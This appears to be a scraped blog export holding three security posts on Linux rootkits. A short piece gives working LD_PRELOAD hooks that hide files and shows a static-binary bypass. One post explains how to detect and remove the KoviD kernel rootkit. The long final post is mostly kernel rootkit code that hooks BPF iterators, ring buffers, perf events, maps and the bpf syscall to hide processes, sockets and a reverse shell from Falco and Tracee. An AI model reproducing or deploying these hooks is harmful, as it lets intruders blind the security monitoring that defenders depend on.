/etc/ld.so.preload file can also be used to persistently load a library into all processes on the system (including root). This file is read before any environment variable.\nInstalling and Hiding Directory with Rootkit To demonstrate this, I\u0026rsquo;ll use a simple LD_PRELOAD rootkit that hooks the readdir, readdir64, and fopen functions to change the behavior of file and directory listings. The code is shown below.\nFull source\nstruct dirent *(*orig_readdir)(DIR *dirp); struct dirent *readdir(DIR *dirp) { if (!orig_readdir) orig_readdir = dlsym(RTLD_NEXT, \u0026#34;readdir\u0026#34;); struct dirent *entry; while ((entry = orig_readdir(dirp)) != NULL) { if (strcmp(entry-\u0026gt;d_name, HIDDEN_DIR) != 0 \u0026amp;\u0026amp; strcmp(entry-\u0026gt;d_name, HIDDEN_FILE) != 0) { return entry; } } return NULL; } This snippet above hooks into the readdir function, which is responsible for listing files in a directory. It uses a pointer orig_readdir to store the address of the original function, retrieved with dlsym(RTLD_NEXT, \u0026ldquo;readdir\u0026rdquo;). Then, in a loop, it calls the original function to get each entry in the directory, but filters out (ignores) entries whose name is equal to \u0026ldquo;secret\u0026rdquo; or \u0026ldquo;ld.so.preload\u0026rdquo;. Thus, these entries never appear to the program that called readdir. When there are no more visible entries, it returns NULL.\nstruct dirent64 *(*orig_readdir64)(DIR *dirp); struct dirent64 *readdir64(DIR *dirp) { if (!orig_readdir64) orig_readdir64 = dlsym(RTLD_NEXT, \u0026#34;readdir64\u0026#34;); struct dirent64 *entry; while ((entry = orig_readdir64(dirp)) != NULL) { if (strcmp(entry-\u0026gt;d_name, HIDDEN_DIR) != 0 \u0026amp;\u0026amp; strcmp(entry-\u0026gt;d_name, HIDDEN_FILE) != 0) { return entry; } } return NULL; } This is the same logic but for the 64-bit version readdir64.\nFILE *(*orig_fopen)(const char *pathname, const char *mode); FILE *fopen(const char *pathname, const char *mode) { if (!orig_fopen) orig_fopen = dlsym(RTLD_NEXT, \u0026#34;fopen\u0026#34;); if (strstr(pathname, HIDDEN_FILE) != NULL) { errno = ENOENT; return NULL; } return orig_fopen(pathname, mode); } This fopen hook hides access to specific files by returning a ‘file not found’ error (ENOENT) if the path contains keywords like ‘ld.so.preload’.\nNow let\u0026rsquo;s compile and load it into /etc/ld.so.preload\nOnce loaded, we can test creating a directory named secret, and see if it is hidden from ls.\nAs expected, it was hidden from ls.\n[Theory] Breaking LD_PRELOAD rootkits Here’s something interesting: rootkits that use the LD_PRELOAD technique depend ENTIRELY on the Linux dynamic loader (ld-linux.so) to \u0026ldquo;inject\u0026rdquo; their malicious libraries before the standard system libraries, such as libc. But does this work with all programs?\nThe short and quick answer is: No!\nWhy does LD_PRELOAD work, and why does it sometimes not work?\nLD_PRELOAD, as explained in previous topics, is an environment variable used by ld-linux.so to load extra libraries before others, which allows it to intercept functions from standard libraries (such as libc). In other words, you can replace system functions, such as those that list files or open files, with customized versions, which is perfect for hiding directories or files, for example.\nBut for this to work, the program has to use dynamic loading and depend on ld-linux.so to resolve these functions.\nWhy do static binaries break this idea?\nStatically linked binaries are \u0026ldquo;self-contained\u0026rdquo;. They incorporate all necessary code from their dependencies (such as libc) directly into the executable. As a result, they do not invoke the dynamic linker at runtime, so LD_PRELOAD and /etc/ld.so.preload are ignored.\nIn other words, LD_PRELOAD and the /etc/ld.so.preload file are simply not used by these binaries. This means that rootkits based on these techniques have no effect on them, practically useless.\nThis is one of the most effective ways to bypass these rootkits.\n[Practice] Breaking LD_PRELOAD rootkits With the rootkit loaded in /etc/ld.so.preload, the secret directory is hidden from commands like ls, which depend on libc and the dynamic loader.\nBut it is easy to bypass this, for example: just compile a static binary, like a simple getdents64.c\ngcc getdents64.c -o getdents64 \u0026ndash;static\nWhen using ldd getdents64, we will see that it does not load any dynamic dependencies, unlike ldd /bin/ls, which depends on libc. Since static binaries do not use the dynamic linker, LD_PRELOAD is completely ignored, and so is the rootkit.\nBypassing LD_PRELOAD rootkits is simply very easy.\nConclusion LD_PRELOAD rootkits are actually very good at hiding artifacts in user space, especially because of their simplicity and the fact that they are more stable than LKM rootkits. However, as we have shown in this post, they are not infallible. Simple techniques, such as the use of static binaries, can easily bypass the hooks applied by the rootkit, precisely because they do not depend on the dynamic loader and the external libc.\nIf you enjoyed this content and want to discuss similar techniques, feel free to join our Discord community. See you next time!\nRootkit Researchers\nhttps://discord.gg/66N5ZQppU7\n","permalink":"http://localhost:1313/hacking/bypass-userland-hooks/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/JhWCyVT.png\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this post, I\u0026rsquo;m going to get into a really cool topic, which is how to bypass the hooks used by LD_PRELOAD rootkits, a technique that is effective against most, if not all, of them.\u003c/p\u003e\n\u003ch2 id=\"ld_preload\"\u003eLD_PRELOAD\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003eLD_PRELOAD\u003c/code\u003e is an environment variable used by dynamic linkers on Unix-like systems (such as /lib64/ld-linux-x86-64.so.2 on x86_64 Linux) to force specific shared libraries to be loaded before any others during program execution.\u003c/p\u003e","title":"Bypassing LD_PRELOAD Rootkits Is Easy"},{"content":" Hello everyone, welcome to this post where I will cover the easiest way on how to detect and remove LKM KoviD rootkit.\nBut first of all, we need to understand how the KoviD works.\nWhat is KoviD? KoviD is a Linux kernel rootkit, containing several features that make it difficult to detect and remove, in my opinion KoviD is the best open source LKM rootkit today, you can see more about it on github.\nNow that we know what KoviD is, we can analyze its code and see how it works, for example, which hooking method it uses.\nFtrace hooking Looking at KoviD sys.c, we can see that it uses a very famous method for hooking syscalls that works very well on newer kernels, which is ftrace (function tracer).\nKeep this information, it will be very useful later in this post.\nSetup KoviD and Loading. According to the kovid readme, before compiling, we need to edit the Makefile to choose a unique file name for \u0026ldquo;/proc/name\u0026rdquo;.\nAfter compiling using make, we can insert it using insmod kovid.ko.\nAfter inserting it, we can see that /proc/mtz had not been enabled and also the module was not hidden after its insertion, so first it is necessary to enable /proc/mtz using kill -SIGCONT 31337 and after that, hide the LKM from lsmod using echo -h \u0026gt;/proc/mtz.\nI also hid the file containing the name mtz, making it invisible in /proc/.\nWell, after enabling /proc/mtz, we can look in dmesg that a random magic word was generated, and this magic word is used to make KoviD visible again.\nIn kovid.c we can see this magic word function being called to make the module visible again.\nDetecting KoviD Well, luckily for us, there is a filesystem that is not very well known, which is tracing, normally on more up-to-date systems, it is already mounted by default, if tracefs is not mounted, just mount it using mount -t tracefs nodev /sys/kernel/tracing, and you can find its documentation at kernel.org.\nAnd in it we can simply view all the LKM functions that are loaded on the machine.\nA very interesting curiosity is that when Kovid is invisible, the trace only shows the addresses of each Kovid function (which in my head still doesn\u0026rsquo;t make much sense, since the /sys/kernel/tracing/available_filter_functions_addrs file was only added in kernel 6.5x, in it we can view the addresses of each function of each loaded lkm too and I am using kernel 5.15.0-119-generic for testing).\nNow, if we make kovid visible again, the name of its functions will appear.\nThis is a very simple way to detect KoviD, and it doesn\u0026rsquo;t require much effort.\nHowever, there is still a way to hide any function/LKM from the tracefs file system, so don\u0026rsquo;t be fooled by that and don\u0026rsquo;t think that if you didn\u0026rsquo;t find anything there that you are safe. Maybe I\u0026rsquo;ll talk about this in a future post.\nYou can also use nitara2 to detect KoviD.\nMaking KoviD hooks useless This part is very interesting and you will learn a really cool trick (if you didn\u0026rsquo;t already know).\nRemember when I mentioned at the beginning of the post that KoviD uses ftrace as a hooking method? So, many people may not know that there is a way to disable ftrace with just one command.\necho 0 \u0026gt; /proc/sys/kernel/ftrace_enabled or sysctl kernel.ftrace_enabled=0 Okay, but what\u0026rsquo;s so great about that? Well, let\u0026rsquo;s go!\nBy temporarily disabling ftrace, all kovid hooks stop working, as it uses ftrace for hooking, but this still does not make kovid visible, but it makes it useless.\nKoviD hides the file containing the name mtz, so /proc/mtz is hidden, and in it is the magic word to make LKM visible again.\nWell now with ftrace disabled we can see that the hidden /proc/mtz has become visible as no kovid hook works as it uses ftrace as syscalls hook.\nSo, after disabling ftrace, just go to /proc/mtz that was visible, get the magic word, and make LKM visible again, being able to remove it.\nAnd this is the easiest way to detect/remove KoviD.\nNotes 1- Of course, this is not 100% effective, as it has a way of hiding from the tracefs filesystem, but against KoviD so far, this works perfectly.\n2- And it is also obvious that in a real scenario, if someone is using KoviD, the name in /proc/name will not be something common like mtz, they would probably use a name that is less \u0026ldquo;imperceptible\u0026rdquo;.\n3- You can make any LKM rootkit that uses ftrace as hooking completely useless, and when you make it useless, you can use that to your advantage and analyze the compromised environment, looking for hidden PIDs, directories/files, etc.\nFinal consideration I hope you enjoyed this post and learned something, if you have any questions, please DM me on Twitter.\n","permalink":"http://localhost:1313/hacking/a-simple-way-to-detect-and-remove-kovid-lkm-rootkit/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/Xd3Y153.jpeg\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eHello everyone, welcome to this post where I will cover the easiest way on how to detect and remove LKM KoviD rootkit.\u003c/p\u003e\n\u003cp\u003eBut first of all, we need to understand how the KoviD works.\u003c/p\u003e\n\u003ch2 id=\"what-is-kovid\"\u003eWhat is KoviD?\u003c/h2\u003e\n\u003cp\u003eKoviD is a Linux kernel rootkit, containing several features that make it difficult to detect and remove, in my opinion KoviD is the best open source LKM rootkit today, you can see more about it on \u003ca href=\"https://github.com/carloslack/KoviD\"\u003egithub\u003c/a\u003e.\u003c/p\u003e","title":"A simple way to detect and remove LKM rootkit KoviD (Outdated)"},{"content":"Stealthy Kernel Rootkit: https://github.com/MatheuZSecurity/Singularity\nRootkit Researchers: https://discord.gg/66N5ZQppU7\nMe: https://www.linkedin.com/in/mathsalves/\nIntroduction Linux security tooling has leaned heavily into eBPF. Projects like Falco, Tracee, and Tetragon made kernel-level telemetry feel like a step change: richer context, low overhead, and visibility that\u0026rsquo;s difficult to evade from user space.\nBut that promise quietly depends on a threat model: the kernel is assumed to be a trustworthy observer.\nThis article explores what happens when that assumption breaks, specifically, when an attacker can execute code in the kernel (e.g., via a loaded module). In that world, the most valuable targets aren\u0026rsquo;t the eBPF programs themselves, but the plumbing around them: iterators, event delivery paths (ring buffer / perf buffer), perf submission, and map operations that turn kernel activity into user-space signals.\nAll research is strictly for educational purposes.\nTable of Contents Introduction The eBPF Security Landscape How eBPF Security Works The False Promise of Kernel Observability Understanding the Attack Surface BPF Iterators BPF Ringbuffers Perf Events BPF Maps Bypassing eBPF Security: Technical Implementation Hook Architecture Process and Network Hiding Intercepting BPF Iterators Filtering Ringbuffer Events Blocking Perf Event Submission Manipulating BPF Maps Real-World Bypass Results Falco Evasion Tracee Evasion Additional Tools Conclusion The eBPF Security Landscape How eBPF Security Works eBPF (extended Berkeley Packet Filter) has revolutionized Linux observability and security. Modern security tools leverage eBPF to monitor kernel events in real-time without modifying kernel code or loading traditional kernel modules.\nKey Components:\neBPF Programs: Sandboxed code running in kernel context, attached to various kernel events (syscalls, tracepoints, kprobes) BPF Maps: Kernel data structures for sharing information between eBPF programs and userspace Ringbuffers/Perf Events: Efficient mechanisms for streaming event data from kernel to userspace BPF Iterators: New mechanism for efficiently iterating over kernel objects (processes, network connections, etc.) Security Tools Using eBPF:\nFalco: Runtime security monitoring, detects anomalous behavior Tracee: System call and event tracing for security analysis Tetragon: Policy enforcement and security observability Cilium: Network security and observability GhostScan: Rootkit detection via memory scanning Decloaker: Hidden process detection The False Promise of Kernel Observability The security community believed eBPF solved a fundamental problem: how do you monitor a system that an attacker controls? The answer seemed obvious: use kernel-level observability that attackers cannot evade.\nThis assumption contains a critical flaw.\nThe Fundamental Problem:\neBPF programs execute inside the kernel they are trying to observe, while the detection pipeline depends on kernel → userspace delivery (ring buffers/perf buffers/iterators) and userspace policy engines. If an attacker gains the ability to load a kernel module (via root access and disabled Secure Boot / unenforced module signing), they can modify the kernel\u0026rsquo;s behavior and selectively disrupt what those eBPF programs and collectors are able to see.\nWhy This Matters:\neBPF programs cannot protect themselves from kernel-level manipulation eBPF verifier only ensures memory safety, not security guarantees All eBPF data flow mechanisms (iterators, ringbuffers, maps) are implemented as kernel functions Kernel functions can be hooked via ftrace The moment an attacker has kernel-level access, observability becomes optional.\nUnderstanding the Attack Surface Before we can bypass eBPF security, we need to understand how these tools collect data. Let\u0026rsquo;s examine each mechanism.\nBPF Iterators BPF iterators allow eBPF programs to efficiently walk kernel data structures. Security tools use iterators to enumerate processes, network connections, and other kernel objects.\nIterator Flow:\nKernel Data (tasks, sockets) -\u0026gt; bpf_iter_run_prog() -\u0026gt; eBPF iterator program -\u0026gt; bpf_seq_write() / bpf_seq_printf() -\u0026gt; Userspace reads via seq_file Key Functions:\nbpf_iter_run_prog(): Executes the eBPF iterator program for each kernel object bpf_seq_write(): Writes data to the seq_file buffer bpf_seq_printf(): Formatted output to seq_file buffer Security Tools Using Iterators:\nGhostScan uses task iterators to detect hidden processes Decloaker uses network iterators to find hidden connections Custom security tools use iterators for forensic analysis BPF Ringbuffers Ringbuffers are the modern replacement for perf buffers, providing efficient event streaming from kernel to userspace with better performance and ordering guarantees.\nRingbuffer Flow:\nKernel Event -\u0026gt; eBPF program -\u0026gt; bpf_ringbuf_reserve() -\u0026gt; bpf_ringbuf_submit() or bpf_ringbuf_output() -\u0026gt; Userspace reads events Key Functions:\nbpf_ringbuf_reserve(): Allocates space in the ringbuffer bpf_ringbuf_submit(): Commits reserved data to the ringbuffer bpf_ringbuf_output(): One-shot write to ringbuffer Security Tools Using Event Delivery Mechanisms:\nFalco (modern eBPF probe): Uses BPF ring buffer (BPF_MAP_TYPE_RINGBUF) for kernel→userspace event delivery (driver/config dependent). Tracee: Uses perfbuffer/perf ring buffers as its primary kernel→userspace event delivery mechanism (and can vary by version/implementation). Tetragon: Uses kernel→userspace buffering mechanisms (e.g., ring buffer / perf-based buffers) depending on the component and version. Note: \u0026ldquo;Perf event arrays\u0026rdquo; and \u0026ldquo;BPF ring buffers\u0026rdquo; are different mechanisms - the former is per-CPU and older, while the latter is shared across CPUs and more efficient.\nPerf Events Perf events are the traditional mechanism for streaming kernel data to userspace. While older than ringbuffers, many tools still use them.\nPerf Event Flow:\nKernel Event -\u0026gt; eBPF program -\u0026gt; perf_event_output() -\u0026gt; perf_trace_run_bpf_submit() -\u0026gt; Userspace reads perf buffer Key Functions:\nperf_event_output(): Writes event to perf buffer perf_trace_run_bpf_submit(): Submits tracepoint data to eBPF programs Security Tools Using Perf Events:\nLegacy Falco versions Custom monitoring tools Kernel tracing utilities BPF Maps BPF maps are kernel data structures that store state and allow communication between eBPF programs and userspace.\nMap Operations:\neBPF program or userspace -\u0026gt; bpf_map_lookup_elem() -\u0026gt; bpf_map_update_elem() -\u0026gt; bpf_map_delete_elem() -\u0026gt; Kernel map data structure Key Functions:\nbpf_map_lookup_elem(): Retrieve value from map bpf_map_update_elem(): Insert or update map entry bpf_map_delete_elem(): Remove map entry Security Use Cases:\nStoring process metadata Tracking network connections Maintaining allow/deny lists Sharing data between eBPF programs Bypassing eBPF Security: Technical Implementation Now that we understand how eBPF security works, let\u0026rsquo;s examine how to systematically blind it.\nHook Architecture Our approach uses ftrace to hook critical BPF functions. Ftrace allows dynamic tracing of kernel functions without modifying kernel code, making it perfect for interception.\nHooked Functions:\nstatic struct ftrace_hook hooks[] = { // BPF Iterator Hooks HOOK(\u0026#34;bpf_iter_run_prog\u0026#34;, hook_bpf_iter_run_prog, \u0026amp;orig_bpf_iter_run_prog), HOOK(\u0026#34;bpf_seq_write\u0026#34;, hook_bpf_seq_write, \u0026amp;orig_bpf_seq_write), HOOK(\u0026#34;bpf_seq_printf\u0026#34;, hook_bpf_seq_printf, \u0026amp;orig_bpf_seq_printf), // BPF Ringbuffer Hooks HOOK(\u0026#34;bpf_ringbuf_output\u0026#34;, hook_bpf_ringbuf_output, \u0026amp;orig_bpf_ringbuf_output), HOOK(\u0026#34;bpf_ringbuf_reserve\u0026#34;, hook_bpf_ringbuf_reserve, \u0026amp;orig_bpf_ringbuf_reserve), HOOK(\u0026#34;bpf_ringbuf_submit\u0026#34;, hook_bpf_ringbuf_submit, \u0026amp;orig_bpf_ringbuf_submit), // BPF Map Hooks HOOK(\u0026#34;bpf_map_lookup_elem\u0026#34;, hook_bpf_map_lookup_elem, \u0026amp;orig_bpf_map_lookup_elem), HOOK(\u0026#34;bpf_map_update_elem\u0026#34;, hook_bpf_map_update_elem, \u0026amp;orig_bpf_map_update_elem), // Perf Event Hooks HOOK(\u0026#34;perf_event_output\u0026#34;, hook_perf_event_output, \u0026amp;orig_perf_event_output), HOOK(\u0026#34;perf_trace_run_bpf_submit\u0026#34;, hook_perf_trace_run_bpf_submit, \u0026amp;orig_perf_trace_run_bpf_submit), // BPF Program Execution HOOK(\u0026#34;__bpf_prog_run\u0026#34;, hook_bpf_prog_run, \u0026amp;orig_bpf_prog_run), // BPF Syscall HOOK(\u0026#34;__x64_sys_bpf\u0026#34;, hook_bpf, \u0026amp;orig_bpf), HOOK(\u0026#34;__ia32_sys_bpf\u0026#34;, hook_bpf_ia32, \u0026amp;orig_bpf_ia32), }; Why This Works:\nKernel-level access: Once loaded, the rootkit runs at ring 0 with full privileges Ftrace hooking: Operates below eBPF programs, allowing us to filter their data sources No eBPF involvement: We\u0026rsquo;re not fighting eBPF, we\u0026rsquo;re cutting off its inputs Selective filtering: Only hide specific processes/connections, not everything Process and Network Hiding The rootkit maintains lists of hidden PIDs and network connections. Child process tracking ensures that when you hide a shell, all spawned processes also remain hidden.\nHidden PID Management:\n#define MAX_HIDDEN_PIDS 32 #define MAX_CHILD_PIDS (MAX_HIDDEN_PIDS * 128) extern int hidden_pids[MAX_HIDDEN_PIDS]; extern int hidden_count; extern int child_pids[MAX_CHILD_PIDS]; extern int child_count; notrace void add_hidden_pid(int pid) { int i; for (i = 0; i \u0026lt; hidden_count; i++) { if (hidden_pids[i] == pid) return; } if (hidden_count \u0026lt; MAX_HIDDEN_PIDS) { hidden_pids[hidden_count++] = pid; } } notrace int is_hidden_pid(int pid) { int i; for (i = 0; i \u0026lt; hidden_count; i++) { if (hidden_pids[i] == pid) return 1; } return 0; } Child Process Tracking:\nstatic notrace bool is_child_of_hidden_process(int pid) { struct task_struct *task; struct task_struct *parent; int depth = 0; int max_depth = 10; bool hidden = false; if (pid \u0026lt;= 0) return false; if (should_hide_pid_by_int(pid)) return true; rcu_read_lock(); task = pid_task(find_vpid(pid), PIDTYPE_PID); if (!task) { rcu_read_unlock(); return false; } parent = task; while (parent \u0026amp;\u0026amp; depth \u0026lt; max_depth) { if (parent-\u0026gt;pid \u0026lt;= 0) break; parent = rcu_dereference(parent-\u0026gt;real_parent); if (!parent || parent-\u0026gt;pid \u0026lt;= 1) break; if (should_hide_pid_by_int(parent-\u0026gt;pid)) { hidden = true; break; } depth++; } rcu_read_unlock(); return hidden; } Network Connection Hiding:\n#define HIDDEN_PORT 8081 static notrace bool should_hide_socket_port(struct sock_common *sk) { __be16 sport, dport; __be32 saddr, daddr; if (!sk) return false; init_hidden_ip(); if (sk-\u0026gt;skc_family == AF_INET) { sport = sk-\u0026gt;skc_num; dport = sk-\u0026gt;skc_dport; saddr = sk-\u0026gt;skc_rcv_saddr; daddr = sk-\u0026gt;skc_daddr; if (sport == HIDDEN_PORT || ntohs(dport) == HIDDEN_PORT) { if (saddr == hidden_ip_cached || daddr == hidden_ip_cached || saddr == htonl(INADDR_ANY) || daddr == htonl(INADDR_ANY)) { return true; } } } else if (sk-\u0026gt;skc_family == AF_INET6) { sport = sk-\u0026gt;skc_num; if (sport == HIDDEN_PORT) { return true; } } return false; } Intercepting BPF Iterators BPF iterators allow tools like GhostScan and Decloaker to enumerate kernel objects. By hooking the iterator execution, we can selectively filter results.\nIterator Context Structures:\nstruct bpf_iter_ctx_tcp { struct bpf_iter_meta *meta; struct sock_common *sk_common; uid_t uid; }; struct bpf_iter_ctx_udp { struct bpf_iter_meta *meta; struct udp_sock *udp_sk; uid_t uid; int bucket; }; struct bpf_iter_ctx_task { struct bpf_iter_meta *meta; struct task_struct *task; }; Hooking bpf_iter_run_prog:\nstatic notrace int hook_bpf_iter_run_prog(struct bpf_prog *prog, void *ctx) { struct bpf_iter_ctx_tcp *tcp_ctx; struct bpf_iter_ctx_udp *udp_ctx; struct bpf_iter_ctx_task *task_ctx; struct sock_common *sk; struct udp_sock *udp_sk; struct task_struct *task; if (!orig_bpf_iter_run_prog || !ctx) goto passthrough; // Check if this is a TCP socket iterator tcp_ctx = (struct bpf_iter_ctx_tcp *)ctx; if (tcp_ctx \u0026amp;\u0026amp; tcp_ctx-\u0026gt;sk_common) { sk = tcp_ctx-\u0026gt;sk_common; if ((unsigned long)sk \u0026gt; PAGE_SIZE) { if (should_hide_socket_port(sk)) { return 0; // Skip this socket } } } // Check if this is a UDP socket iterator udp_ctx = (struct bpf_iter_ctx_udp *)ctx; if (udp_ctx \u0026amp;\u0026amp; udp_ctx-\u0026gt;udp_sk) { udp_sk = udp_ctx-\u0026gt;udp_sk; if ((unsigned long)udp_sk \u0026gt; PAGE_SIZE) { sk = \u0026amp;udp_sk-\u0026gt;inet.sk.__sk_common; if (should_hide_socket_port(sk)) { return 0; // Skip this socket } } } // Check if this is a task iterator task_ctx = (struct bpf_iter_ctx_task *)ctx; if (task_ctx \u0026amp;\u0026amp; task_ctx-\u0026gt;task) { task = task_ctx-\u0026gt;task; if ((unsigned long)task \u0026gt; PAGE_SIZE \u0026amp;\u0026amp; task-\u0026gt;pid \u0026gt; 0) { if (is_child_of_hidden_process(task-\u0026gt;pid)) { return 0; // Skip this task } } } passthrough: return orig_bpf_iter_run_prog(prog, ctx); } How This Defeats Detection:\nWhen GhostScan or Decloaker use BPF iterators to enumerate processes or network connections, our hook intercepts each iteration. For hidden PIDs or network connections, we return 0 (skip), preventing the eBPF program from ever seeing that object. The security tool thinks it\u0026rsquo;s seeing the complete system state, but we\u0026rsquo;ve selectively filtered the view.\nHooking seq_file Output:\nIterators also use bpf_seq_write() and bpf_seq_printf() to format output. We hook these too:\nstatic notrace int hook_bpf_seq_write(struct seq_file *seq, const void *data, u32 len) { const u32 *pid_data; int i; if (!orig_bpf_seq_write) return -ENOSYS; if (!data || len \u0026lt; sizeof(u32)) goto passthrough; // Scan the data for PIDs pid_data = (const u32 *)data; for (i = 0; i \u0026lt; (len / sizeof(u32)) \u0026amp;\u0026amp; i \u0026lt; 16; i++) { u32 potential_pid = pid_data[i]; if (potential_pid \u0026gt; 0 \u0026amp;\u0026amp; potential_pid \u0026lt; 4194304) { if (is_child_of_hidden_process((int)potential_pid)) { return 0; // Block this write } } } passthrough: return orig_bpf_seq_write(seq, data, len); } Filtering Ringbuffer Events Falco and Tracee heavily rely on ringbuffers for event streaming. By hooking ringbuffer operations, we can prevent events related to our processes from reaching userspace.\nFalco Event Structure:\nstruct falco_event_hdr { u64 ts; u64 tid; u32 len; u16 type; u32 nparams; } __attribute__((packed)); static notrace bool is_falco_event(void *data, u64 size) { struct falco_event_hdr *hdr; if (!data || size \u0026lt; sizeof(struct falco_event_hdr)) return false; hdr = (struct falco_event_hdr *)data; // Validate event structure if (hdr-\u0026gt;type \u0026gt;= 1 \u0026amp;\u0026amp; hdr-\u0026gt;type \u0026lt;= 400 \u0026amp;\u0026amp; hdr-\u0026gt;len \u0026gt; 0 \u0026amp;\u0026amp; hdr-\u0026gt;len \u0026lt; 65536 \u0026amp;\u0026amp; hdr-\u0026gt;nparams \u0026lt; 20) { return true; } return false; } Hooking bpf_ringbuf_output:\nstatic notrace long hook_bpf_ringbuf_output(void *ringbuf, void *data, u64 size, u64 flags) { struct falco_event_hdr *hdr; int pid; if (!orig_bpf_ringbuf_output) return -ENOSYS; if (!data || !ringbuf) goto passthrough; // Check if this looks like a Falco event if (!is_falco_event(data, size)) goto passthrough; hdr = (struct falco_event_hdr *)data; pid = (int)(hdr-\u0026gt;tid \u0026amp; 0xFFFFFFFF); // If this event is from a hidden process, drop it if (is_child_of_hidden_process(pid)) { return 0; } passthrough: return orig_bpf_ringbuf_output(ringbuf, data, size, flags); } Hooking bpf_ringbuf_reserve:\nstatic notrace void *hook_bpf_ringbuf_reserve(void *ringbuf, u64 size, u64 flags) { pid_t pid; if (!orig_bpf_ringbuf_reserve) return NULL; pid = current-\u0026gt;tgid; // Deny ringbuffer allocation for hidden processes if (is_child_of_hidden_process(pid)) { return NULL; } return orig_bpf_ringbuf_reserve(ringbuf, size, flags); } Hooking bpf_ringbuf_submit:\nstatic notrace void hook_bpf_ringbuf_submit(void *data, u64 flags) { struct falco_event_hdr *hdr; int pid; if (!orig_bpf_ringbuf_submit) return; if (!data) goto passthrough; if (!is_falco_event(data, 0)) goto passthrough; hdr = (struct falco_event_hdr *)data; pid = (int)(hdr-\u0026gt;tid \u0026amp; 0xFFFFFFFF); // Drop submission for hidden processes if (is_child_of_hidden_process(pid)) { return; } passthrough: orig_bpf_ringbuf_submit(data, flags); } How This Defeats Detection:\nFalco and Tracee see syscall events, process creation, file access, and network activity through ringbuffers. By intercepting at three points (reserve, output, submit), we ensure that events from hidden processes never make it to the ringbuffer. From Falco\u0026rsquo;s perspective, these processes simply don\u0026rsquo;t exist.\nBlocking Perf Event Submission Older tools and some Falco configurations still use perf events instead of ringbuffers. We hook these too.\nHooking perf_event_output:\nstatic notrace int hook_perf_event_output(struct perf_event *event, struct perf_sample_data *data, struct pt_regs *regs) { pid_t pid; if (!orig_perf_event_output) return -ENOSYS; pid = current-\u0026gt;tgid; // Drop perf events for hidden processes if (is_child_of_hidden_process(pid)) { return 0; } return orig_perf_event_output(event, data, regs); } Hooking perf_trace_run_bpf_submit:\nstatic notrace void hook_perf_trace_run_bpf_submit(void *raw_data, int size, int rctx, struct pt_regs *regs, struct hlist_head *head, struct task_struct *task) { if (!orig_perf_trace_run_bpf_submit) return; // Check if the task is hidden if (task \u0026amp;\u0026amp; is_child_of_hidden_process(task-\u0026gt;pid)) { return; } // Also check current process if (is_child_of_hidden_process(current-\u0026gt;tgid)) { return; } orig_perf_trace_run_bpf_submit(raw_data, size, rctx, regs, head, task); } Manipulating BPF Maps Security tools often use BPF maps to store process metadata, track suspicious activity, or maintain state. By hooking map operations, we can prevent our processes from being recorded.\nHooking bpf_map_lookup_elem:\nstatic notrace void *hook_bpf_map_lookup_elem(struct bpf_map *map, const void *key) { void *ret; pid_t pid; if (!orig_bpf_map_lookup_elem) return NULL; ret = orig_bpf_map_lookup_elem(map, key); // If the map uses PIDs as keys, filter hidden PIDs if (ret \u0026amp;\u0026amp; map \u0026amp;\u0026amp; map-\u0026gt;key_size == sizeof(pid_t)) { pid = *(pid_t *)key; if (is_child_of_hidden_process(pid)) { return NULL; // Pretend the entry doesn\u0026#39;t exist } } return ret; } Hooking bpf_map_update_elem:\nstatic notrace long hook_bpf_map_update_elem(struct bpf_map *map, void *key, void *value, u64 flags) { u32 *pid_key; if (!orig_bpf_map_update_elem) return -ENOSYS; // If this is a PID-keyed map, block updates for hidden PIDs if (map \u0026amp;\u0026amp; map-\u0026gt;key_size == sizeof(u32)) { pid_key = (u32 *)key; if (is_child_of_hidden_process((int)*pid_key)) { return 0; // Silently succeed without actually updating } } return orig_bpf_map_update_elem(map, key, value, flags); } How This Defeats Detection:\nSecurity tools that track process behavior using BPF maps will never see entries for our hidden processes. When they try to look up a hidden PID, the lookup returns NULL. When they try to store data about a hidden process, the update silently fails. The tool\u0026rsquo;s logic continues to work, but it operates on an incomplete view of reality.\nBlocking eBPF Program Execution For maximum stealth, we can also prevent eBPF programs from running when triggered by our hidden processes.\nHooking __bpf_prog_run:\nstatic notrace u32 hook_bpf_prog_run(const struct bpf_prog *prog, const void *ctx) { pid_t pid; if (!orig_bpf_prog_run) return 0; pid = current-\u0026gt;tgid; // Don\u0026#39;t execute eBPF programs for hidden processes if (is_child_of_hidden_process(pid)) { return 0; } return orig_bpf_prog_run(prog, ctx); } Hooking the bpf() syscall:\nstatic notrace asmlinkage long hook_bpf(const struct pt_regs *regs) { int cmd; pid_t pid; if (!orig_bpf) return -ENOSYS; cmd = (int)regs-\u0026gt;di; pid = current-\u0026gt;tgid; // Hidden processes can use bpf() normally // but we could log/block specific commands here if (is_child_of_hidden_process(pid)) { // Optional: block certain BPF commands } return orig_bpf(regs); } Real-World Bypass Results Proof-of-Concept video demonstrating these results:\nFalco Evasion Falco is one of the most popular eBPF-based runtime security tools. It monitors syscalls, file access, network connections, and process execution to detect threats.\nWhat Falco Should Detect:\nReverse shell creation Suspicious network connections Critical file read And common post-exploitation activity (process exec/spawn, outbound connections, and sensitive file access).\nBypass Results:\nWith our BPF hooks active:\nReverse Shell: Connected to attacker-controlled server on port 8081. Falco detected nothing. Process Execution: Spawned interactive bash shell. Falco detected nothing. File Modification: Modified and read /etc/passwd, /etc/shadow. Falco detected nothing. Network Activity: Established multiple TCP connections. Falco detected nothing. Privilege Escalation: Used rootkit\u0026rsquo;s signal-based privilege escalation (kill -59). Falco detected nothing. Why The Bypass Works:\nFalco\u0026rsquo;s eBPF programs successfully attach to syscall tracepoints and execute as designed. However, every event they generate passes through kernel→userspace delivery (ring buffer / perf buffer, depending on driver/version), which we can disrupt via hooked kernel functions. Events from hidden processes are filtered before reaching Falco\u0026rsquo;s userspace agent. From Falco\u0026rsquo;s perspective, the system appears normal.\nTracee Evasion Tracee provides detailed system call tracing and event analysis. It\u0026rsquo;s designed to detect anomalous behavior and hidden processes.\nWhat Tracee Should Detect:\nHidden processes Kernel module loading Syscall anomalies And common attacker workflows (process hiding and suspicious network behavior).\nBypass Results:\nWith our BPF hooks active:\nProcess Enumeration: Tracee\u0026rsquo;s process listing showed no hidden processes Syscall Tracing: No syscalls from hidden processes appeared in traces Network Connections: Hidden network connections 